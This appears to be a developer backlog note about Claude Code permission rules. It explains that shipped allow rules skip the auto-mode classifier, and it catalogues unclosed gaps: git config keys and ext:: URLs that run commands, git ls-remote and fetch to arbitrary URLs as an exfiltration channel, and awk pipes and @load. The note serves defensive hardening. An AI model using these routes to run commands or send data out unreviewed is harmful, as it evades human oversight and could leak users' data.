---
status: open
created: 2026-10-14
last-reviewed: 2026-10-14
staleness-threshold: 90d
related_plan: null
---

# Shipped allow rules skip the auto-mode classifier

Found 2026-10-14 while porting Side-Quest-Atlas's dangerous-commands rules.

**What decays here:** the docs quotes, the file and line references, and which grants each
template ships. Re-read them before relying on them.

## The mechanism

Claude Code's auto mode resolves allow, ask and deny rules *before* the classifier (docs,
permission-modes, "How the classifier evaluates actions", step 1). Only broad code-execution rules
are dropped on entering auto mode: `Bash(*)`, interpreter wildcards, package-manager run commands,
and `Agent` and `Monitor`. A slash command's `allowed-tools` is also a permission grant, for the turn
that invokes it (docs, skills, "Pre-approve tools for a skill").

So anything a shipped allow rule matches runs with **no review at all** in auto mode, unless
`scripts/dangerous-commands.*` stops it. The port blocked these forms:
- force push in any position;
- a `!` git alias;
- awk `system()` / `| getline` / `|& getline`.

The rest of the surface is still open.

## Still open

- **`Bash(git *)`** ships in `templates/.claude/settings.json` and covers git's own ways to run a
  command or reach the network:
  - config keys that run a command: `core.sshCommand`, `core.pager`, `diff.external`,
    `credential.helper`, `core.fsmonitor`, `--upload-pack=`, `--exec=`, and `ext::` remote URLs (with
    `protocol.ext.allow`);
  - the same set through `GIT_CONFIG_COUNT`/`GIT_CONFIG_KEY_n`/`GIT_CONFIG_VALUE_n`;
  - network verbs to a URL that is not a configured remote: `git ls-remote https://host/<data>`,
    `git fetch <url>` and `git clone <url>`. Data can ride in the URL path, so this is an
    exfiltration channel.
- **`/code-review`'s `allowed-tools`** grants `Bash(awk *)` and `Bash(find *)`, and
  `/change-review`'s grants `Bash(find *)`.
  - The port covers awk's `system()` and `getline`, but not `print ... | "cmd"`, gawk's indirect
    `@f()` calls or `@load`.
  - Narrowing the grant itself may be the better fix: decide what those commands actually need awk
    for.
- **Agent `tools:` lists.** `templates/.claude/agents/opposition.md` names `Bash(sed *)`,
  `Bash(awk *)` and `Bash(find *)`, and `researcher.md` names `Bash(find *)`. Unresolved: whether a
  subagent's `tools:` entry acts as an allow rule or only makes the tool available. The answer
  decides whether "no shipped rule approves sed" (the reason the port skipped sed's `e` command)
  holds inside those agents. Found by the port's /code-review (Correctness F3).
- **A force push the hook cannot see.** A push alias in user config (`pf = push --force`),
  `remote.<name>.mirror` or a `+` push refspec turns a plain `git push` / `git pf` into a forced or
  mirror push, all under `Bash(git *)`. A text hook sees only the command; closing this would need
  a check of the effective git config.

## Options

1. **More hook rows.** Each is a denylist of spellings. Keep them structural, and measure false
   positives against real transcripts the way the port did.
2. **Narrow the shipped grants**, for example `Bash(git status *)` rather than `Bash(git *)`. This
   costs prompts for every adopter, and needs fleet data on which git subcommands agents actually run.
3. **Move broad grants to `ask` rules.** The docs say explicit ask rules prompt in every mode,
   including `bypassPermissions`.

Related: `docs/backlog/agent-scoped-network-deny-for-review-agents.md`, [NS-50](a) (`mb upgrade`
overwrites the `permissions` block of `.claude/settings.json`).
